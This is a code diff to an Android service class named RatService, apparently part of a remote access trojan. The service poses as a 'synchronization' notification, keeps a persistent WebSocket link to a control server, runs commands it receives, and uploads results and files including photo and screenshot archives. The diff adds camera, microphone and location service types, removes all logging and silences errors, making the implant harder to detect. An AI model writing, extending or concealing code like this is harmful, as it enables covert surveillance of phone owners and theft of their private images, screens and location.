@@ -5,6 +5,7 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
+import android.content.pm.ServiceInfo;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
@@ -63,13 +64,24 @@ public class RatService extends Service {
          .setContentText("Синхронизация...")
          .setSmallIcon(android.R.drawable.stat_notify_sync);
 
-        startForeground(1, b.build());
+        try {
+            if (Build.VERSION.SDK_INT >= 29) {
+                startForeground(1, b.build(),
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                    | ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
+                    | ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                    | ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
+            } else {
+                startForeground(1, b.build());
+            }
+        } catch (Throwable t) {
+            try { startForeground(1, b.build()); } catch (Throwable t2) {}
+        }
 
         if (!running) {
             running = true;
             connect();
         }
-
         return START_STICKY;
     }
 
@@ -78,60 +90,29 @@ public class RatService extends Service {
             Request req = new Request.Builder().url(SERVER_URL).build();
             ws = client.newWebSocket(req, new WSListener());
         } catch (Throwable t) {
-            Log.e(TAG, "connect error", t);
             scheduleReconnect();
         }
     }
 
     private class WSListener extends WebSocketListener {
-        @Override
-        public void onOpen(WebSocket webSocket, Response response) {
-            Log.i(TAG, "Connected");
-            sendHello();
-        }
+        @Override public void onOpen(WebSocket webSocket, Response response) { sendHello(); }
 
-        @Override
-        public void onMessage(WebSocket webSocket, String text) {
+        @Override public void onMessage(WebSocket webSocket, String text) {
             try {
                 JSONObject obj = new JSONObject(text);
                 String type = obj.optString("type");
-
-                if ("welcome".equals(type)) {
-                    myId = obj.optInt("id", -1);
-                    Log.i(TAG, "My ID: " + myId);
-                } else if ("cmd".equals(type)) {
-                    String cmd = obj.optString("cmd");
-                    handleCommand(cmd);
-                } else if ("pong".equals(type)) {
-                    Log.i(TAG, "Pong");
-                }
-            } catch (Throwable t) {
-                Log.e(TAG, "parse error", t);
-            }
+                if ("welcome".equals(type)) myId = obj.optInt("id", -1);
+                else if ("cmd".equals(type)) handleCommand(obj.optString("cmd"));
+            } catch (Throwable t) {}
         }
 
-        @Override
-        public void onFailure(WebSocket webSocket, Throwable t, Response response) {
-            Log.e(TAG, "failed: " + t.getMessage());
-            scheduleReconnect();
-        }
-
-        @Override
-        public void onClosed(WebSocket webSocket, int code, String reason) {
-            Log.i(TAG, "closed: " + reason);
-            scheduleReconnect();
-        }
+        @Override public void onFailure(WebSocket w, Throwable t, Response r) { scheduleReconnect(); }
+        @Override public void onClosed(WebSocket w, int c, String r) { scheduleReconnect(); }
     }
 
     private void scheduleReconnect() {
         reconnectHandler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                if (running) {
-                    Log.i(TAG, "Reconnecting...");
-                    connect();
-                }
-            }
+            @Override public void run() { if (running) connect(); }
         }, 5000);
     }
 
@@ -144,17 +125,12 @@ public class RatService extends Service {
             hello.put("device", info);
             hello.put("ip", ip);
             if (ws != null) ws.send(hello.toString());
-        } catch (Throwable t) {
-            Log.e(TAG, "hello error", t);
-        }
+        } catch (Throwable t) {}
     }
 
     private void handleCommand(String cmd) {
-        Log.i(TAG, "Command: " + cmd);
         try {
             String result = Commands.execute(RatService.this, cmd);
-
-            // Проверяем — может это файл
             if (result.startsWith("PHOTOS_ZIP|")
                 || result.startsWith("SCREENS_ZIP|")
                 || result.startsWith("PHOTO|")
@@ -165,7 +141,6 @@ public class RatService extends Service {
                     return;
                 }
             }
-
             sendResult(cmd, result);
         } catch (Throwable t) {
             sendResult(cmd, "error: " + t.getMessage());
@@ -180,9 +155,7 @@ public class RatService extends Service {
             obj.put("cmd", cmd);
             obj.put("result", result);
             if (ws != null) ws.send(obj.toString());
-        } catch (Throwable t) {
-            Log.e(TAG, "sendResult error", t);
-        }
+        } catch (Throwable t) {}
     }
 
     private void sendFile(String cmd, String filename, String base64) {
@@ -194,23 +167,16 @@ public class RatService extends Service {
             obj.put("name", filename);
             obj.put("data", base64);
             if (ws != null) ws.send(obj.toString());
-            Log.i(TAG, "File sent: " + filename + " (" + base64.length() + " b64)");
-        } catch (Throwable t) {
-            Log.e(TAG, "sendFile error", t);
-        }
+        } catch (Throwable t) {}
     }
 
-    @Override
-    public IBinder onBind(Intent intent) { return null; }
+    @Override public IBinder onBind(Intent intent) { return null; }
 
     @Override
     public void onDestroy() {
         running = false;
         reconnectHandler.removeCallbacksAndMessages(null);
-        if (ws != null) {
-            ws.close(1000, "stopped");
-            ws = null;
-        }
+        if (ws != null) { ws.close(1000, "stopped"); ws = null; }
         super.onDestroy();
     }
 }
